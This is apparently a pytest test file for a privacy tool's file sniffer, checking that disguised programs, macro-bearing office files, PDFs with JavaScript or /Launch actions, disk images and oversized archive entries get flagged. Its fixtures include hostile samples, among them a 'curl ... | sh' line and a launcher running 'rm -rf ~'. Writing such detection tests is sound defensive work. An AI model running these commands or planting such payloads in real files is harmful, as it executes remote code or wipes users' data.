"""What a download really is (tools/sniff.py): judged by content, then by name. Samples made here, each
the smallest file that carries the marks the real format has."""

from __future__ import annotations

import io
import os
import zipfile

import pytest

from daprivacyscanner.tools import sniff


def judge(tmp_path, name, data: bytes):
    p = tmp_path / name
    p.write_bytes(data)
    fd = os.open(p, os.O_RDONLY)
    try:
        return sniff.inspect(fd, name, len(data))
    finally:
        os.close(fd)


def zipped(files: dict[str, bytes], first: str | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        if first:
            z.writestr(first, files.pop(first), compress_type=zipfile.ZIP_STORED)
        for n, d in files.items():
            z.writestr(n, d)
    return buf.getvalue()


@pytest.mark.parametrize("name, data, what", [
    ("invoice.pdf", b"\x7fELF\x02\x01\x01" + bytes(100), "a Linux program"),
    ("notes.txt", b"#!/bin/sh\ncurl https://example.com/x | sh\n", "a script"),
    ("photo.jpg", b"# made by hand\n\n[Desktop Entry]\nType=Application\nExec=sh -c 'rm -rf ~'\n", "a desktop launcher"),
    ("report.docx", b"MZ" + bytes(200), "a Windows program"),
    ("scan.png", b"L\x00\x00\x00\x01\x14\x02\x00" + bytes(80), "a Windows shortcut"),
    ("song.mp3", zipped({"AndroidManifest.xml": b"x", "classes.dex": b"x"}), "an Android app"),
    ("library.zip", zipped({"META-INF/MANIFEST.MF": b"Main-Class: A\n", "A.class": b"\xca\xfe\xba\xbe"}), "a Java program"),
])
def test_a_program_by_any_other_name(tmp_path, name, data, what):
    ins = judge(tmp_path, name, data)
    assert ins.kind == "program" and ins.what == what and not ins.viewable
    assert any(f"it is {what}" in w and "Don't open it" in w for w in ins.warnings)


def test_a_program_named_as_one_and_one_named_twice(tmp_path):
    assert judge(tmp_path, "tool.sh", b"#!/bin/sh\n").warnings == [sniff.RUNS_TEXT]
    w = judge(tmp_path, "invoice.pdf.desktop", b"[Desktop Entry]\nExec=x\n").warnings
    assert w[0] == sniff.RUNS_TEXT and "look like a pdf file" in w[1]


def test_office_documents_and_their_macros(tmp_path):
    plain = judge(tmp_path, "a.docx", zipped({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w/>"}))
    assert plain.kind == "document" and plain.viewable and plain.warnings == [sniff.FETCH_TEXT]
    macro = judge(tmp_path, "b.docx", zipped({"[Content_Types].xml": b"<Types/>", "word/vbaProject.bin": b"\xd0\xcf"}))
    assert macro.viewable and any("contains macros" in w for w in macro.warnings)
    odt = zipped({"mimetype": b"application/vnd.oasis.opendocument.text", "content.xml": b"<x/>",
                  "Basic/Standard/Module1.xml": b"<script:module/>", "Basic/Standard/script-lb.xml": b"<x/>"},
                 first="mimetype")
    ins = judge(tmp_path, "c.odt", odt)
    assert ins.what == "an OpenDocument file" and ins.mime == "application/vnd.oasis.opendocument.text"
    assert any("macros or scripts" in w for w in ins.warnings)
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(3000) + "_VBA_PROJECT".encode("utf-16-le") + bytes(100)
    assert any("contains macros" in w for w in judge(tmp_path, "d.doc", ole).warnings)
    assert any("can carry macros" in w for w in judge(tmp_path, "e.xlsm", b"\x00\x01garbage").warnings)
    epub = judge(tmp_path, "book.epub", zipped({"mimetype": b"application/epub+zip", "OEBPS/a.xhtml": b"<x/>"},
                                               first="mimetype"))
    assert epub.what == "an e-book (EPUB)" and epub.viewable


def test_pdfs_say_what_they_carry(tmp_path):
    ins = judge(tmp_path, "form.pdf", b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> "
                                       b"/AA << /O << /S /Launch /F (cmd.exe) >> >> >>\nendobj\n%%EOF\n")
    assert ins.kind == "document" and ins.viewable and ins.mime == "application/pdf"
    assert ins.warnings[0] == sniff.FETCH_TEXT
    assert any("JavaScript" in w for w in ins.warnings) and any("/Launch" in w for w in ins.warnings)
    assert judge(tmp_path, "plain.pdf", b"%PDF-1.4\n%%EOF\n").warnings == [sniff.FETCH_TEXT]


def test_disk_images_and_archives_are_never_opened(tmp_path):
    iso = bytearray(0x9000)
    iso[0x8001:0x8006] = b"CD001"
    ins = judge(tmp_path, "holiday.mp4", bytes(iso))
    assert ins.kind == "disk image" and not ins.viewable and "opening it mounts it" in ins.warnings[0]
    tar = bytearray(1024)
    tar[257:262] = b"ustar"
    assert judge(tmp_path, "x.tar", bytes(tar)).kind == "archive"
    z = judge(tmp_path, "photos.zip", zipped({"a.jpg": b"\xff\xd8\xff", "setup.exe": b"MZ", "run.desktop": b"x"}))
    assert z.kind == "archive" and "what is inside isn't checked" in z.warnings[0]
    assert any("setup.exe, run.desktop" in w for w in z.warnings)
    assert judge(tmp_path, "pics.zip", zipped({"a.jpg": b"\xff\xd8\xff"})).warnings == [z.warnings[0]]
    assert judge(tmp_path, "disk.img", b"\x00" * 100).kind == "unknown"                # by name, still a disk image:
    assert "opening it mounts it" in judge(tmp_path, "disk.img", b"\x00" * 100).warnings[0]


def test_pictures_pages_and_text(tmp_path):
    png = judge(tmp_path, "a.png", b"\x89PNG\r\n\x1a\n" + bytes(20))
    assert png.kind == "picture" and png.viewable and png.warnings == []
    page = judge(tmp_path, "page.html", b"<p>hello <img src=https://example.com/t.png>")
    assert page.what == "a web page" and page.viewable and page.warnings == [sniff.FETCH_TEXT]
    svg = judge(tmp_path, "logo.svg", b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"/>')
    assert svg.mime == "image/svg+xml" and svg.viewable
    assert judge(tmp_path, "readme.txt", b"hello\n").viewable
    assert judge(tmp_path, "data.bin", b"\x00\x01\x02").kind == "unknown"


def test_a_name_alone_still_warns(tmp_path):
    """Before a file can be read (or when it can't be), the name's own warnings stand."""
    from daprivacyscanner.tools.transfer import warnings
    assert warnings("tool.sh") == [sniff.RUNS_TEXT]
    assert warnings("report.pdf") == [sniff.FETCH_TEXT_PLAIN]


def test_a_huge_mimetype_entry_is_not_unpacked(tmp_path, monkeypatch):
    """Only the first bytes of an OpenDocument's mimetype entry are read: a download whose entry unpacks to
    gigabytes (a few MB compressed) doesn't take the app's memory when the page lists the folder."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("mimetype", b"application/vnd.oasis.opendocument.text" + b" " * (64 << 20))
        z.writestr("content.xml", b"<x/>")
    data = buf.getvalue()
    assert len(data) < (1 << 20)
    read = []
    orig = zipfile.ZipExtFile.read
    monkeypatch.setattr(zipfile.ZipExtFile, "read", lambda self, n=-1: read.append(n) or orig(self, n))
    ins = judge(tmp_path, "letter.odt", data)
    assert ins.what == "an OpenDocument file" and read and all(0 <= n <= 100 for n in read)
